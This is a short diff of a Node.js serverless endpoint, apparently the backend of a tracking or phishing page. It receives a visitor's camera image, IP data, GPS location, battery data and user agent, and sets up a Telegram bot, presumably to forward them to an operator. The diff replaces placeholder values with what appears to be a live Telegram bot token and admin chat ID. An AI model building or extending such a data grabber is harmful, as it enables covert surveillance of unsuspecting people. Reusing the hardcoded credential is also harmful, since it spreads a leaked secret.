@@ -4,8 +4,8 @@ module.exports = async (req, res) => {
   if (req.method !== 'POST') return res.status(405).send('Method Not Allowed');
 
   const { image, ipData, gpsData, batteryData, userAgent, timestamp } = req.body;
-  const BOT_TOKEN = 'ISI_TOKEN_BOT_LU'; // GANTI INI
-  const ADMIN_CHAT_ID = 'ISI_CHAT_ID_LU'; // GANTI INI
+  const BOT_TOKEN = '8804022157:AAF9Yny0nZv1WiRtIPNkHBkOPnUJ0hQKlWw'; // GANTI INI
+  const ADMIN_CHAT_ID = '6437858218'; // GANTI INI
   const bot = new Telegraf(BOT_TOKEN);
 
   try {
